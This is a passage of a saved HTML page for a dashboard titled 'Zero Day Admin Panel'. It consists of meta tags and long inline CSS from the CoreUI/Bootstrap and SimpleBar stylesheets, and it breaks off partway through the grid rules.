ZTOHMCIhVRVcv0Hs90SMAV5HPPfV75PNZwijkk+mXUeQ5dPQUp06eBWDI0IHcNHIIQXDZempmJIIEyWSaN1/8884eSrfl/wcTJWj0HchY9QAAAABJRU5ErkJggg=="
        />
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no" />
        <meta name="description" content="Zeroday Studio Make yourself unique" />
        <meta name="author" content="Łukasz Holeczek" />
        <meta name="keyword" content="Bootstrap,Admin,Template,SCSS,HTML,RWD,Dashboard" />
        <title>Zero Day Admin Panel</title>

        <!-- Vendors styles-->
        <style data-savepage-href="vendors/simplebar/css/simplebar.css">
            [data-simplebar] {
                position: relative;
                flex-direction: column;
                flex-wrap: wrap;
                justify-content: flex-start;
                align-content: flex-start;
                align-items: flex-start;
            }

            .simplebar-wrapper {
                overflow: hidden;
                width: inherit;
                height: inherit;
                max-width: inherit;
                max-height: inherit;
            }

            .simplebar-mask {
                direction: inherit;
                position: absolute;
                overflow: hidden;
                padding: 0;
                margin: 0;
                left: 0;
                top: 0;
                bottom: 0;
                right: 0;
                width: auto !important;
                height: auto !important;
                z-index: 0;
            }

            .simplebar-offset {
                direction: inherit !important;
                box-sizing: inherit !important;
                resize: none !important;
                position: absolute;
                top: 0;
                left: 0;
                bottom: 0;
                right: 0;
                padding: 0;
                margin: 0;
                -webkit-overflow-scrolling: touch;
            }

            .simplebar-content-wrapper {
                direction: inherit;
                box-sizing: border-box !important;
                position: relative;
                display: block;
                height: 100%; /* Required for horizontal native scrollbar to not appear if parent is taller than natural height */
                width: auto;
                max-width: 100%; /* Not required for horizontal scroll to trigger */
                max-height: 100%; /* Needed for vertical scroll to trigger */
                overflow: auto;
                scrollbar-width: none;
                -ms-overflow-style: none;
            }

            .simplebar-content-wrapper::-webkit-scrollbar,
            .simplebar-hide-scrollbar::-webkit-scrollbar {
                display: none;
                width: 0;
                height: 0;
            }

            .simplebar-content:before,
            .simplebar-content:after {
                content: " ";
                display: table;
            }

            .simplebar-placeholder {
                max-height: 100%;
                max-width: 100%;
                width: 100%;
                pointer-events: none;
            }

            .simplebar-height-auto-observer-wrapper {
                box-sizing: inherit !important;
                height: 100%;
                width: 100%;
                max-width: 1px;
                position: relative;
                float: left;
                max-height: 1px;
                overflow: hidden;
                z-index: -1;
                padding: 0;
                margin: 0;
                pointer-events: none;
                flex-grow: inherit;
                flex-shrink: 0;
                flex-basis: 0;
            }

            .simplebar-height-auto-observer {
                box-sizing: inherit;
                display: block;
                opacity: 0;
                position: absolute;
                top: 0;
                left: 0;
                height: 1000%;
                width: 1000%;
                min-height: 1px;
                min-width: 1px;
                overflow: hidden;
                pointer-events: none;
                z-index: -1;
            }

            .simplebar-track {
                z-index: 1;
                position: absolute;
                right: 0;
                bottom: 0;
                pointer-events: none;
                overflow: hidden;
            }

            [data-simplebar].simplebar-dragging {
                pointer-events: none;
                -webkit-touch-callout: none;
                -webkit-user-select: none;
                -khtml-user-select: none;
                -moz-user-select: none;
                -ms-user-select: none;
                user-select: none;
            }

            [data-simplebar].simplebar-dragging .simplebar-content {
                pointer-events: none;
                -webkit-touch-callout: none;
                -webkit-user-select: none;
                -khtml-user-select: none;
                -moz-user-select: none;
                -ms-user-select: none;
                user-select: none;
            }

            [data-simplebar].simplebar-dragging .simplebar-track {
                pointer-events: all;
            }

            .simplebar-scrollbar {
                position: absolute;
                left: 0;
                right: 0;
                min-height: 10px;
            }

            .simplebar-scrollbar:before {
                position: absolute;
                content: "";
                background: black;
                border-radius: 7px;
                left: 2px;
                right: 2px;
                opacity: 0;
                transition: opacity 0.2s 0.5s linear;
            }

            .simplebar-scrollbar.simplebar-visible:before {
                opacity: 0.5;
                transition-delay: 0s;
                transition-duration: 0s;
            }

            .simplebar-track.simplebar-vertical {
                top: 0;
                width: 11px;
            }

            .simplebar-scrollbar:before {
                top: 2px;
                bottom: 2px;
                left: 2px;
                right: 2px;
            }

            .simplebar-track.simplebar-horizontal {
                left: 0;
                height: 11px;
            }

            .simplebar-track.simplebar-horizontal .simplebar-scrollbar {
                right: auto;
                left: 0;
                top: 0;
                bottom: 0;
                min-height: 0;
                min-width: 10px;
                width: auto;
            }

            /* Rtl support */
            [data-simplebar-direction="rtl"] .simplebar-track.simplebar-vertical {
                right: auto;
                left: 0;
            }

            .simplebar-dummy-scrollbar-size {
                direction: rtl;
                position: fixed;
                opacity: 0;
                visibility: hidden;
                height: 500px;
                width: 500px;
                overflow-y: hidden;
                overflow-x: scroll;
                -ms-overflow-style: scrollbar !important;
            }

            .simplebar-dummy-scrollbar-size > div {
                width: 200%;
                height: 200%;
                margin: 10px 0;
            }

            .simplebar-hide-scrollbar {
                position: fixed;
                left: 0;
                visibility: hidden;
                overflow-y: scroll;
                scrollbar-width: none;
                -ms-overflow-style: none;
            }
        </style>
        <style data-savepage-href="css/vendors/simplebar.css">
            .simplebar-content {
                display: flex;
                flex-direction: column;
                min-height: 100%;
            }
        </style>
        <!-- Main styles for this application-->
        <style data-savepage-href="css/style.css">
            :root {
                --cui-blue: #0d6efd;
                --cui-indigo: #6610f2;
                --cui-purple: #6f42c1;
                --cui-pink: #d63384;
                --cui-red: #dc3545;
                --cui-orange: #fd7e14;
                --cui-yellow: #ffc107;
                --cui-green: #198754;
                --cui-teal: #20c997;
                --cui-cyan: #0dcaf0;
                --cui-black: #000015;
                --cui-white: #fff;
                --cui-gray: #8a93a2;
                --cui-gray-dark: #636f83;
                --cui-gray-100: #ebedef;
                --cui-gray-200: #d8dbe0;
                --cui-gray-300: #c4c9d0;
                --cui-gray-400: #b1b7c1;
                --cui-gray-500: #9da5b1;
                --cui-gray-600: #8a93a2;
                --cui-gray-700: #768192;
                --cui-gray-800: #636f83;
                --cui-gray-900: #4f5d73;
                --cui-primary: #321fdb;
                --cui-secondary: #9da5b1;
                --cui-success: #2eb85c;
                --cui-info: #39f;
                --cui-warning: #f9b115;
                --cui-danger: #e55353;
                --cui-light: #ebedef;
                --cui-dark: #4f5d73;
                --cui-primary-rgb: 50, 31, 219;
                --cui-secondary-rgb: 157, 165, 177;
                --cui-success-rgb: 46, 184, 92;
                --cui-info-rgb: 51, 153, 255;
                --cui-warning-rgb: 249, 177, 21;
                --cui-danger-rgb: 229, 83, 83;
                --cui-light-rgb: 235, 237, 239;
                --cui-dark-rgb: 79, 93, 115;
                --cui-white-rgb: 255, 255, 255;
                --cui-black-rgb: 0, 0, 21;
                --cui-body-color-rgb: 44, 56, 74;
                --cui-body-bg-rgb: 255, 255, 255;
                --cui-font-sans-serif: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", "Noto Sans", "Liberation Sans", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
                --cui-font-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
                --cui-gradient: linear-gradient(180deg, rgba(255, 255, 255, 0.15), rgba(255, 255, 255, 0));
                --cui-body-font-family: var(--cui-font-sans-serif);
                --cui-body-font-size: 1rem;
                --cui-body-font-weight: 400;
                --cui-body-line-height: 1.5;
                --cui-body-color: rgba(44, 56, 74, 0.95);
                --cui-body-bg: #fff;
                --cui-border-width: 1px;
                --cui-border-style: solid;
                --cui-border-color: #d8dbe0;
                --cui-border-color-translucent: rgba(0, 0, 21, 0.175);
                --cui-border-radius: 0.375rem;
                --cui-border-radius-sm: 0.25rem;
                --cui-border-radius-lg: 0.5rem;
                --cui-border-radius-xl: 1rem;
                --cui-border-radius-2xl: 2rem;
                --cui-border-radius-pill: 50rem;
                --cui-heading-color: unset;
                --cui-link-color: #321fdb;
                --cui-link-hover-color: #2819af;
                --cui-code-color: #d63384;
                --cui-highlight-bg: #fff3cd;
                --cui-breakpoint-xs: 0;
                --cui-breakpoint-sm: 576px;
                --cui-breakpoint-md: 768px;
                --cui-breakpoint-lg: 992px;
                --cui-breakpoint-xl: 1200px;
                --cui-breakpoint-xxl: 1400px;
                --cui-mobile-breakpoint: md;
            }
            *,
            *::before,
            *::after {
                box-sizing: border-box;
            }
            @media (prefers-reduced-motion: no-preference) {
                :root {
                    scroll-behavior: smooth;
                }
            }
            body {
                margin: 0;
                font-family: var(--cui-body-font-family);
                font-size: var(--cui-body-font-size);
                font-weight: var(--cui-body-font-weight);
                line-height: var(--cui-body-line-height);
                color: var(--cui-body-color);
                text-align: var(--cui-body-text-align);
                background-color: var(--cui-body-bg);
                -webkit-text-size-adjust: 100%;
                -webkit-tap-highlight-color: transparent;
            }
            hr {
                margin: 1rem 0;
                color: inherit;
                border: 0;
                border-top: 1px solid;
                opacity: 0.25;
            }
            h6,
            .h6,
            h5,
            .h5,
            h4,
            .h4,
            h3,
            .h3,
            h2,
            .h2,
            h1,
            .h1 {
                margin-top: 0;
                margin-bottom: 0.5rem;
                font-weight: 500;
                line-height: 1.2;
                color: var(--cui-heading-color);
            }
            h1,
            .h1 {
                font-size: calc(1.375rem + 1.5vw);
            }
            @media (min-width: 1200px) {
                h1,
                .h1 {
                    font-size: 2.5rem;
                }
            }
            h2,
            .h2 {
                font-size: calc(1.325rem + 0.9vw);
            }
            @media (min-width: 1200px) {
                h2,
                .h2 {
                    font-size: 2rem;
                }
            }
            h3,
            .h3 {
                font-size: calc(1.3rem + 0.6vw);
            }
            @media (min-width: 1200px) {
                h3,
                .h3 {
                    font-size: 1.75rem;
                }
            }
            h4,
            .h4 {
                font-size: calc(1.275rem + 0.3vw);
            }
            @media (min-width: 1200px) {
                h4,
                .h4 {
                    font-size: 1.5rem;
                }
            }
            h5,
            .h5 {
                font-size: 1.25rem;
            }
            h6,
            .h6 {
                font-size: 1rem;
            }
            p {
                margin-top: 0;
                margin-bottom: 1rem;
            }
            abbr[title] {
                -webkit-text-decoration: underline dotted;
                text-decoration: underline dotted;
                cursor: help;
                -webkit-text-decoration-skip-ink: none;
                text-decoration-skip-ink: none;
            }
            address {
                margin-bottom: 1rem;
                font-style: normal;
                line-height: inherit;
            }
            ol,
            ul,
            dl {
                margin-top: 0;
                margin-bottom: 1rem;
            }
            ol ol,
            ul ul,
            ol ul,
            ul ol {
                margin-bottom: 0;
            }
            dt {
                font-weight: 700;
            }
            dd {
                margin-bottom: 0.5rem;
            }
            html:not([dir="rtl"]) dd {
                margin-left: 0;
            }
            *[dir="rtl"] dd {
                margin-right: 0;
            }
            blockquote {
                margin: 0 0 1rem;
            }
            b,
            strong {
                font-weight: bolder;
            }
            small,
            .small {
                font-size: 0.875em;
            }
            mark,
            .mark {
                padding: 0.1875em;
                background-color: var(--cui-highlight-bg);
            }
            sub,
            sup {
                position: relative;
                font-size: 0.75em;
                line-height: 0;
                vertical-align: baseline;
            }
            sub {
                bottom: -0.25em;
            }
            sup {
                top: -0.5em;
            }
            a {
                color: var(--cui-link-color);
                text-decoration: underline;
            }
            a:hover {
                color: var(--cui-link-hover-color);
            }
            a:not([href]):not([class]),
            a:not([href]):not([class]):hover {
                color: inherit;
                text-decoration: none;
            }
            pre,
            code,
            kbd,
            samp {
                font-family: var(--cui-font-monospace);
                font-size: 1em;
            }
            pre {
                display: block;
                margin-top: 0;
                margin-bottom: 1rem;
                overflow: auto;
                font-size: 0.875em;
                color: var(--cui-pre-color, unset);
            }
            pre code {
                font-size: inherit;
                color: inherit;
                word-break: normal;
            }
            code {
                font-size: 0.875em;
                color: var(--cui-code-color);
                word-wrap: break-word;
            }
            a > code {
                color: inherit;
            }
            kbd {
                padding: 0.1875rem 0.375rem;
                font-size: 0.875em;
                color: var(--cui-kbd-color, var(--cui-body-bg));
                background-color: var(--cui-kbd-bg, var(--cui-body-color));
                border-radius: 0.25rem;
            }
            kbd kbd {
                padding: 0;
                font-size: 1em;
            }
            figure {
                margin: 0 0 1rem;
            }
            img,
            svg {
                vertical-align: middle;
            }
            table {
                caption-side: bottom;
                border-collapse: collapse;
            }
            caption {
                padding-top: 0.5rem;
                padding-bottom: 0.5rem;
                color: var(--cui-table-caption-color, rgba(44, 56, 74, 0.38));
                text-align: left;
            }
            th {
                font-weight: 600;
                text-align: inherit;
                text-align: -webkit-match-parent;
            }
            thead,
            tbody,
            tfoot,
            tr,
            td,
            th {
                border-color: inherit;
                border-style: solid;
                border-width: 0;
            }
            label {
                display: inline-block;
            }
            button {
                border-radius: 0;
            }
            button:focus:not(:focus-visible) {
                outline: 0;
            }
            input,
            button,
            select,
            optgroup,
            textarea {
                margin: 0;
                font-family: inherit;
                font-size: inherit;
                line-height: inherit;
            }
            button,
            select {
                text-transform: none;
            }
            [role="button"] {
                cursor: pointer;
            }
            select {
                word-wrap: normal;
            }
            select:disabled {
                opacity: 1;
            }
            [list]:not([type="date"]):not([type="datetime-local"]):not([type="month"]):not([type="week"]):not([type="time"])::-webkit-calendar-picker-indicator {
                display: none !important;
            }
            button,
            [type="button"],
            [type="reset"],
            [type="submit"] {
                -webkit-appearance: button;
            }
            button:not(:disabled),
            [type="button"]:not(:disabled),
            [type="reset"]:not(:disabled),
            [type="submit"]:not(:disabled) {
                cursor: pointer;
            }
            ::-moz-focus-inner {
                padding: 0;
                border-style: none;
            }
            textarea {
                resize: vertical;
            }
            fieldset {
                min-width: 0;
                padding: 0;
                margin: 0;
                border: 0;
            }
            legend {
                width: 100%;
                padding: 0;
                margin-bottom: 0.5rem;
                font-size: calc(1.275rem + 0.3vw);
                line-height: inherit;
            }
            html:not([dir="rtl"]) legend {
                float: left;
            }
            *[dir="rtl"] legend {
                float: right;
            }
            @media (min-width: 1200px) {
                legend {
                    font-size: 1.5rem;
                }
            }
            legend + * {
                clear: left;
            }
            ::-webkit-datetime-edit-fields-wrapper,
            ::-webkit-datetime-edit-text,
            ::-webkit-datetime-edit-minute,
            ::-webkit-datetime-edit-hour-field,
            ::-webkit-datetime-edit-day-field,
            ::-webkit-datetime-edit-month-field,
            ::-webkit-datetime-edit-year-field {
                padding: 0;
            }
            ::-webkit-inner-spin-button {
                height: auto;
            }
            [type="search"] {
                outline-offset: -2px;
                -webkit-appearance: textfield;
            }
            *[dir="rtl"] [type="tel"],
            *[dir="rtl"] [type="url"],
            *[dir="rtl"] [type="email"],
            *[dir="rtl"] [type="number"] {
                direction: ltr;
            }
            ::-webkit-search-decoration {
                -webkit-appearance: none;
            }
            ::-webkit-color-swatch-wrapper {
                padding: 0;
            }
            ::-webkit-file-upload-button {
                font: inherit;
                -webkit-appearance: button;
            }
            ::file-selector-button {
                font: inherit;
                -webkit-appearance: button;
            }
            output {
                display: inline-block;
            }
            iframe {
                border: 0;
            }
            summary {
                display: list-item;
                cursor: pointer;
            }
            progress {
                vertical-align: baseline;
            }
            [hidden] {
                display: none !important;
            }
            .lead {
                font-size: 1.25rem;
                font-weight: 300;
            }
            .display-1 {
                font-size: calc(1.625rem + 4.5vw);
                font-weight: 300;
                line-height: 1.2;
            }
            @media (min-width: 1200px) {
                .display-1 {
                    font-size: 5rem;
                }
            }
            .display-2 {
                font-size: calc(1.575rem + 3.9vw);
                font-weight: 300;
                line-height: 1.2;
            }
            @media (min-width: 1200px) {
                .display-2 {
                    font-size: 4.5rem;
                }
            }
            .display-3 {
                font-size: calc(1.525rem + 3.3vw);
                font-weight: 300;
                line-height: 1.2;
            }
            @media (min-width: 1200px) {
                .display-3 {
                    font-size: 4rem;
                }
            }
            .display-4 {
                font-size: calc(1.475rem + 2.7vw);
                font-weight: 300;
                line-height: 1.2;
            }
            @media (min-width: 1200px) {
                .display-4 {
                    font-size: 3.5rem;
                }
            }
            .display-5 {
                font-size: calc(1.425rem + 2.1vw);
                font-weight: 300;
                line-height: 1.2;
            }
            @media (min-width: 1200px) {
                .display-5 {
                    font-size: 3rem;
                }
            }
            .display-6 {
                font-size: calc(1.375rem + 1.5vw);
                font-weight: 300;
                line-height: 1.2;
            }
            @media (min-width: 1200px) {
                .display-6 {
                    font-size: 2.5rem;
                }
            }
            .list-unstyled {
                list-style: none;
            }
            html:not([dir="rtl"]) .list-unstyled {
                padding-left: 0;
            }
            *[dir="rtl"] .list-unstyled {
                padding-right: 0;
            }
            .list-inline {
                list-style: none;
            }
            html:not([dir="rtl"]) .list-inline {
                padding-left: 0;
            }
            *[dir="rtl"] .list-inline {
                padding-right: 0;
            }
            .list-inline-item {
                display: inline-block;
            }
            html:not([dir="rtl"]) .list-inline-item:not(:last-child) {
                margin-right: 0.5rem;
            }
            *[dir="rtl"] .list-inline-item:not(:last-child) {
                margin-left: 0.5rem;
            }
            .initialism {
                font-size: 0.875em;
                text-transform: uppercase;
            }
            .blockquote {
                margin-bottom: 1rem;
                font-size: 1.25rem;
            }
            .blockquote > :last-child {
                margin-bottom: 0;
            }
            .blockquote-footer {
                margin-top: -1rem;
                margin-bottom: 1rem;
                font-size: 0.875em;
                color: #8a93a2;
            }
            .blockquote-footer::before {
                content: "— ";
            }
            .img-fluid {
                max-width: 100%;
                height: auto;
            }
            .img-thumbnail {
                padding: 0.25rem;
                background-color: var(--cui-thumbnail-bg, #fff);
                border: 1px solid var(--cui-thumbnail-border-color, var(--cui-border-color));
                border-radius: 0.375rem;
                max-width: 100%;
                height: auto;
            }
            .figure {
                display: inline-block;
            }
            .figure-img {
                margin-bottom: 0.5rem;
                line-height: 1;
            }
            .figure-caption {
                font-size: 0.875em;
                color: var(--cui-figure-caption-color, #8a93a2);
            }
            .container,
            .container-fluid,
            .container-xxl,
            .container-xl,
            .container-lg,
            .container-md,
            .container-sm {
                --cui-gutter-x: 1.5rem;
                --cui-gutter-y: 0;
                width: 100%;
                padding-right: calc(var(--cui-gutter-x) * 0.5);
                padding-left: calc(var(--cui-gutter-x) * 0.5);
                margin-right: auto;
                margin-left: auto;
            }
            @media (min-width: 576px) {
                .container-sm,
                .container {
                    max-width: 540px;
                }
            }
            @media (min-width: 768px) {
                .container-md,
                .container-sm,
                .container {
                    max-width: 720px;
                }
            }
            @media (min-width: 992px) {
                .container-lg,
                .container-md,
                .container-sm,
                .container {
                    max-width: 960px;
                }
            }
            @media (min-width: 1200px) {
                .container-xl,
                .container-lg,
                .container-md,
                .container-sm,
                .container {
                    max-width: 1140px;
                }
            }
            @media (min-width: 1400px) {
                .container-xxl,
                .container-xl,
                .container-lg,
                .container-md,
                .container-sm,
                .container {
                    max-width: 1320px;
                }
            }
            .row {
                --cui-gutter-x: 1.5rem;
                --cui-gutter-y: 0;
                display: flex;
                flex-wrap: wrap;
                margin-top: calc(-1 * var(--cui-gutter-y));
                margin-right: calc(-0.5 * var(--cui-gutter-x));
                margin-left: calc(-0.5 * var(--cui-gutter-x));
            }
            .row > * {
                flex-shrink: 0;
                width: 100%;
                max-width: 100%;
                padding-right: calc(var(--cui-gutter-x) * 0.5);
                padding-left: calc(var(--cui-gutter-x) * 0.5);
                margin-top: var(--cui-gutter-y);
            }
            .col {
                flex: 1 0 0%;
            }
            .row-cols-auto > * {
                flex: 0 0 auto;
                width: auto;
            }
            .row-cols-1 > * {
                flex: 0 0 auto;
                width: 100%;
            }
            .row-cols-2 > * {
                flex: 0 0 auto;
                width: 50%;
            }
            .row-cols-3 > * {
                flex: 0 0 auto;
                width: 33.3333333333%;
            }
            .row-cols-4 > * {
                flex: 0 0 auto;
                width: 25%;
            }
            .row-cols-5 > * {
                flex: 0 0 auto;
                width: 20%;
            }
            .row-cols-6 > * {
                flex: 0 0 auto;
                width: 16.6666666667%;
            }
            .col-auto {
                flex: 0 0 auto;
                width: auto;
            }
            .col-1 {
                flex: 0 0 auto;
                width: 8.33333333%;
            }
            .col-2 {
                flex: 0 0 auto;
                width: 16.66666667%;
            }
            .col-3 {
                flex: 0 0 auto;
                width: 25%;
            }
            .col-4 {
                flex: 0 0 auto;
                width: 33.33333333%;
            }
            .col-5 {
                flex: 0 0 auto;
                width: 41.66666667%;
            }
            .col-6 {
                flex: 0 0 auto;
                width: 50%;
            }
            .col-7 {
                flex: 0 0 auto;
                width: 58.33333333%;
            }
            .col-8 {
                flex: 0 0 auto;
                width: 66.66666667%;
            }
            .col-9 {
                flex: 0 0 auto;
                width: 75%;
            }
            .col-10 {
                flex: 0 0 auto;
                width: 83.33333333%;
            }
            .col-11 {
                flex: 0 0 auto;
                width: 91.66666667%;
            }
            .col-12 {
                flex: 0 0 auto;
                width: 100%;
            }
            html:not([dir="rtl"]) .offset-1 {
                margin-left: 8.33333333%;
            }
            *[dir="rtl"] .offset-1 {
                margin-right: 8.33333333%;
            }
            html:not([dir="rtl"]) .offset-2 {
                margin-left: 16.66666667%;
            }
            *[dir="rtl"] .offset-2 {
                margin-right: 16.66666667%;
            }
            html:not([dir="rtl"]) .offset-3 {
                margin-left: 25%;
            }
            *[dir="rtl"] .offset-3 {
                margin-right: 25%;
            }
            html:not([dir="rtl"]) .offset-4 {
                margin-left: 33.33333333%;
            }
            *[dir="rtl"] .offset-4 {
                margin-right: 33.33333333%;
            }
            html:not([dir="rtl"]) .offset-5 {
                margin-left: 41.66666667%;
            }
            *[dir="rtl"] .offset-5 {
                margin-right: 41.66666667%;
            }
            html:not([dir="rtl"]) .offset-6 {
                margin-left: 50%;
            }
            *[dir="rtl"] .offset-6 {
                margin-right: 50%;
            }
            html:not([dir="rtl"]) .offset-7 {
                margin-left: 58.33333333%;
            }
            *[dir="rtl"] .offset-7 {
                margin-right: 58.33333333%;
            }
            html:not([dir="rtl"]) .offset-8 {
                margin-left: 66.66666667%;
            }
            *[dir="rtl"] .offset-8 {
                margin-right: 66.66666667%;
            }
            html:not([dir="rtl"]) .offset-9 {
                margin-left: 75%;
            }
            *[dir="rtl"] .offset-9 {
                margin-right: 75%;
            }
            html:not([dir="rtl"]) .offset-10 {
                margin-left: 83.33333333%;
            }
            *[dir="rtl"] .offset-10 {
                margin-right: 83.33333333%;
            }
            html:not([dir="rtl"]) .offset-11 {
                margin-left: 91.66666667%;
            }
            *[dir="rtl"] .offset-11 {
                margin-right: 91.66666667%;
            }
            .g-0,
            .gx-0 {
                --cui-gutter-x: 0;
            }
            .g-0,
            .gy-0 {
                --cui-gutter-y: 0;
            }
            .g-1,
            .gx-1 {
                --cui-gutter-x: 0.25rem;
            }
            .g-1,
            .gy-1 {
                --cui-gutter-y: 0.25rem;
            }
            .g-2,
            .gx-2 {
                --cui-gutter-x: 0.5rem;
            }
            .g-2,
            .gy-2 {
                --cui-gutter-y: 0.5rem;
            }
            .g-3,
            .gx-3 {
                --cui-gutter-x: 1rem;
            }
            .g-3,
            .gy-3 {
                --cui-gutter-y: 1rem;
            }
            .g-4,
            .gx-4 {
                --cui-gutter-x: 1.5rem;
            }
            .g-4,
            .gy-4 {
                --cui-gutter-y: 1.5rem;
            }
            .g-5,
            .gx-5 {
                --cui-gutter-x: 3rem;
            }
            .g-5,
            .gy-5 {
                --cui-gutter-y: 3rem;
            }
            @media (min-width: 576px) {
                .col-sm {
                    flex: 1 0 0%;
                }
                .row-cols-sm-auto > * {
                    flex: 0 0 auto;
                    width: auto;
                }
                .row-cols-sm-1 > * {
                    flex: 0 0 auto;
                    width: 100%;
                }
                .row-cols-sm-2 > * {
                    flex: 0 0 auto;
                    width: 50%;
                }
                .row-cols-sm-3 > * {
                    flex: 0 0 auto;
                    width: 33.3333333333%;
                }
                .row-cols-sm-4 > * {
                    flex: 0 0 auto;
                    width: 25%;
                }
                .row-cols-sm-5 > * {
                    flex: 0 0 auto;
                    width: 20%;
                }
                .row-cols-sm-6 > * {
                    flex: 0 0 auto;
                    width: 16.6666666667%;
                }
                .col-sm-auto {
                    flex: 0 0 auto;
                    width: auto;
                }
                .col-sm-1 {
                    flex: 0 0 auto;
                    width: 8.33333333%;
                }
                .col-sm-2 {
                    flex: 0 0 auto;
                    width: 16.66666667%;
                }
                .col-sm-3 {
                    flex: 0 0 auto;
                    width: 25%;
                }
                .col-sm-4 {
                    flex: 0 0 auto;
                    width: 33.33333333%;
                }
                .col-sm-5 {
                    flex: 0 0 auto;
                    width: 41.66666667%;
                }
                .col-sm-6 {
                    flex: 0 0 auto;
                    width: 50%;
                }
                .col-sm-7 {
                    flex: 0 0 auto;
                    width: 58.33333333%;
                }
                .col-sm-8 {
                    flex: 0 0 auto;
                    width: 66.66666667%;
                }
                .col-sm-9 {
                    flex: 0 0 auto;
                    width: 75%;
                }
                .col-sm-10 {
                    flex: 0 0 auto;
                    width: 83.33333333%;
                }
                .col-sm-11 {
                    flex: 0 0 auto;
                    width: 91.66666667%;
                }
                .col-sm-12 {
                    flex: 0 0 auto;
                    width: 100%;
                }
                html:not([dir="rtl"]) .offset-sm-0 {
                    margin-left: 0;
                }
                *[dir="rtl"] .offset-sm-0 {
                    margin-right: 0;
                }
                html:not([dir="rtl"]) .offset-sm-1 {
                    margin-left: 8.33333333%;
                }
                *[dir="rtl"] .offset-sm-1 {
                    margin-right: 8.33333333%;
                }
                html:not([dir="rtl"]) .offset-sm-2 {
                    margin-left: 16.66666667%;
                }
                *[dir="rtl"] .offset-sm-2 {
                    margin-right: 16.66666667%;
                }
                html:not([dir="rtl"]) .offset-sm-3 {
                    margin-left: 25%;
                }
                *[dir="rtl"] .offset-sm-3 {
                    margin-right: 25%;
                }
                html:not([dir="rtl"]) .offset-sm-4 {
                    margin-left: 33.33333333%;
                }
                *[dir="rtl"] .offset-sm-4 {
                    margin-right: 33.33333333%;
                }
                html:not([dir="rtl"]) .offset-sm-5 {
                    margin-left: 41.66666667%;
                }
                *[dir="rtl"] .offset-sm-5 {
                    margin-right: 41.66666667%;
                }
                html:not([dir="rtl"]) .offset-sm-6 {
                    margin-left: 50%;
                }
                *[dir="rtl"] .offset-sm-6 {
                    margin-right: 50%;
                }
                html:not([dir="rtl"]) .offset-sm-7 {
                    margin-left: 58.33333333%;
                }
                *[dir="rtl"] .offset-sm-7 {
                    margin-right: 58.33333333%;
                }
                html:not([dir="rtl"]) .offset-sm-8 {
                    margin-left: 66.66666667%;
                }
                *[dir="rtl"] .offset-sm-8 {
                    margin-right: 66.66666667%;
                }
                html:not([dir="rtl"]) .offset-sm-9 {
                    margin-left: 75%;
                }
                *[dir="rtl"] .offset-sm-9 {
                    margin-right: 75%;
                }
                html:not([dir="rtl"]) .offset-sm-10 {
                    margin-left: 83.33333333%;
                }
                *[dir="rtl"] .offset-sm-10 {
                    margin-right: 83.33333333%;
                }
                html:not([dir="rtl"]) .offset-sm-11 {
                    margin-left: 91.66666667%;
                }
                *[dir="rtl"] .offset-sm-11 {
                    margin-right: 91.66666667%;
                }
                .g-sm-0,
                .gx-sm-0 {
                    --cui-gutter-x: 0;
                }
                .g-sm-0,
                .gy-sm-0 {
                    --cui-gutter-y: 0;
                }
                .g-sm-1,
                .gx-sm-1 {
                    --cui-gutter-x: 0.25rem;
                }
                .g-sm-1,
                .gy-sm-1 {
                    --cui-gutter-y: 0.25rem;
                }
                .g-sm-2,
                .gx-sm-2 {
                    --cui-gutter-x: 0.5rem;
                }
                .g-sm-2,
                .gy-sm-2 {
                    --cui-gutter-y: 0.5rem;
                }
                .g-sm-3,
                .gx-sm-3 {
                    --cui-gutter-x: 1rem;
                }
                .g-sm-3,
                .gy-sm-3 {
                    --cui-gutter-y: 1rem;
                }
                .g-sm-4,
                .gx-sm-4 {
                    --cui-gutter-x: 1.5rem;
                }
                .g-sm-4,
                .gy-sm-4 {
                    --cui-gutter-y: 1.5rem;
                }
                .g-sm-5,
                .gx-sm-5 {
                    --cui-gutter-x: 3rem;
                }
                .g-sm-5,
                .gy-sm-5 {
                    --cui-gutter-y: 3rem;
                }
            }
            @media (min-width: 768px) {
                .col-md {
                    flex: 1 0 0%;
                }
                .row-cols-md-auto > * {
                    flex: 0 0 auto;
                    width: auto;
                }
                .row-cols-md-1 > * {
                    flex: 0 0 auto;
                    width: 100%;
                }
                .row-cols-md-2 > * {
                    flex: 0 0 auto;
                    width: 50%;
                }
                .row-cols-md-3 > * {
                    flex: 0 0 auto;
                    width: 33.3333333333%;
                }
                .row-cols-md-4 > * {
                    flex: 0 0 auto;
                    width: 25%;
                }
                .row-cols-md-5 > * {
                    flex: 0 0 auto;
                    width: 20%;
                }
                .row-cols-md-6 > * {
                    flex: 0 0 auto;
                    width: 16.6666666667%;
                }
                .col-md-auto {
                    flex: 0 0 auto;
                    width: auto;
                }
                .col-md-1 {
                    flex: 0 0 auto;
                    width: 8.33333333%;
                }
                .col-md-2 {
                    flex: 0 0 auto;
                    width: 16.66666667%;
                }
                .col-md-3 {
                    flex: 0 0 auto;
                    width: 25%;
                }
                .col-md-4 {
                    flex: 0 0 auto;
                    width: 33.33333333%;
                }
                .col-md-5 {
                    flex: 0 0 auto;
                    width: 41.66666667%;
                }
                .col-md-6 {
                    flex: 0 0 auto;
                    width: 50%;
                }
                .col-md-7 {
                    flex: 0 0 auto;
                    width: 58.33333333%;
                }
                .col-md-8 {
                    flex: 0 0 auto;
                    width: 66.66666667%;
                }
                .col-md-9 {
                    flex: 0 0 auto;
                    width: 75%;
                }
                .col-md-10 {
                    flex: 0 0 auto;
                    width: 83.33333333%;
                }
                .col-md-11 {
                    flex: 0 0 auto;
                    width: 91.66666667%;
                }
                .col-md-12 {
                    flex: 0 0 auto;
                    width: 100%;
                }
                html:not([dir="rtl"]) .offset-md-0 {
                    margin-left: 0;
                }
                *[dir="rtl"] .offset-md-0 {
                    margin-right: 0;
                }
                html:not([dir="rtl"]) .offset-md-1 {
                    margin-left: 8.33333333%;
                }
                *[dir="rtl"] .offset-md-1 {
                    margin-right: 8.33333333%;
                }
                html:not([dir="rtl"]) .offset-md-2 {
                    margin-left: 16.66666667%;
                }
                *[dir="rtl"] .offset-md-2 {
                    margin-right: 16.66666667%;
                }
                html:not([dir="rtl"]) .offset-md-3 {
                    margin-left: 25%;
                }
                *[dir="rtl"] .offset-md-3 {
